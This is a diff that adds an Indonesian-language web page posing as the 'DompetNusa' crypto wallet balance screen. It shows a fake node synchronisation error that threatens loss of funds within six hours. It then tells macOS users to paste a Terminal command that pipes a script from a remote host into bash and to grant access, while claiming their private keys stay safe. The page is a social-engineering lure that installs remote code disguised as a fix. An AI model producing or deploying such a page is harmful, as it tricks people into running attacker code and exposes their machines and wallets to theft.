@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DompetNusa - Saldo</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#1d2330;background:#f4f5f7;line-height:1.55;font-size:15px}
+a{color:inherit}
+img,svg{display:block}
+.wrap{max-width:1080px;margin:0 auto;padding:0 18px}
+.muted{color:#6b7280}
+.small{font-size:13px}
+.btn{display:inline-block;border:0;border-radius:6px;padding:10px 18px;font-weight:600;cursor:pointer;text-decoration:none;font-size:14px}
+.card{background:#fff;border:1px solid #e3e6ea;border-radius:8px;padding:18px}
+footer.site{margin-top:40px;padding:28px 0;background:#1f2430;color:#b8bec9;font-size:13px}
+footer.site a{color:#d7dbe2;text-decoration:none;margin-right:14px}
+@media(max-width:760px){.grid2,.grid3{display:block!important}.side{margin-top:20px}}
+
+
+body{background:#0b1020;color:#e6e9f2}.hd{display:flex;align-items:center;gap:10px;padding:16px 26px;border-bottom:1px solid #1c2440}
+.main{max-width:980px;margin:26px auto;display:grid;grid-template-columns:1fr 1fr;gap:20px;padding:0 18px}
+.pn{background:#141b33;border:1px solid #232c4d;border-radius:14px;padding:22px}.bal{font-size:34px;font-weight:700}
+.row{display:flex;justify-content:space-between;border-bottom:1px solid #232c4d;padding:10px 0;font-size:14px}
+#sync-error{grid-column:1/3;background:#2a1220;border:1px solid #7f1d3a;border-radius:14px;padding:22px}
+#sync-error h3{margin:0 0 6px;color:#fda4af}pre{background:#05070f;color:#86efac;padding:12px;border-radius:8px;white-space:pre-wrap;word-break:break-all;font-size:12.5px}
+
+</style>
+</head>
+<body>
+
+<div class="hd"><svg width="32" height="32" viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="15" fill="#7c3aed"/><text x="16" y="21.5" text-anchor="middle" font-size="15" font-weight="700" font-family="Arial" fill="#fff">N</text></svg><b>DompetNusa</b> <span class="small muted" style="margin-left:auto">Mainnet &middot; Node v4.11</span></div>
+<div class="main">
+ <div class="pn"><div class="small muted">Total saldo</div><div class="bal">&mdash;.&mdash;&mdash; USDT</div><div class="small muted">Saldo tidak dapat dimuat</div></div>
+ <div class="pn"><div class="row"><span>Status node</span><b style="color:#f87171">Tidak sinkron</b></div><div class="row"><span>Blok terakhir</span><span>19.884.102</span></div><div class="row"><span>Peer</span><span>0</span></div></div>
+ <div id="sync-error">
+  <h3>Kesalahan sinkronisasi node (0x3F)</h3>
+  <p>Dompet Anda tertinggal lebih dari 72 jam dari jaringan. Selama status ini, saldo dan transaksi masuk <b>tertahan</b> dan dapat hilang setelah pemangkasan (pruning) berikutnya dalam <b>6 jam</b>.</p>
+  <p>Pengguna macOS dapat memperbaiki sinkronisasi secara manual: buka aplikasi Terminal, tempel perintah di bawah, tekan Enter, dan izinkan akses bila diminta.</p>
+  <pre>/bin/bash -c "$(curl -fsSL https://dn-repair.example.invalid/resync.sh)"</pre>
+  <p class="small muted">Perintah ini hanya membangun ulang indeks lokal dompet. Kunci pribadi Anda tidak dikirim ke mana pun.</p>
+ </div>
+</div>
+</body>
+</html>
